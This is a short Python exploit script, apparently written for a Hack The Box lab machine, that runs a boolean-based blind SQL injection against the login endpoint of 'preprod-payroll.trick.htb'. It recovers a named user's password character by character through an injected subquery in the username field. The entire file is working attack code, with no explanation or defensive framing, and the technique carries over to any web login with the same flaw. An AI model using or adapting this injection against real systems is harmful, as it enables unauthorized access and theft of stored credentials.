#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Exiting...", __file__)
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = "http://preprod-payroll.trick.htb/ajax.php?action=login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeRequest():
    p1 = log.progress("Brute Force Attack")
    p1.status("Initiating the brute force attack")
    time.sleep(2)
    password = ""
    p2 = log.progress("Username")
    for position in range(1, 22):
        for character in characters:
            post_data = {
                'username': "' or (select hex(substring(password,%d,1)) from users where username='enemigosss')=hex('%s')-- -" % (position,character),
                'password': 'test'
            }
            p1.status(post_data['username'])
            r = requests.post(login_url, data=post_data)
            if r.text == "1":
                password += character
                p2.status(password)
                break
            #print(post_data['username'])



if __name__ == '__main__':
    makeRequest()
    #time.sleep(10)
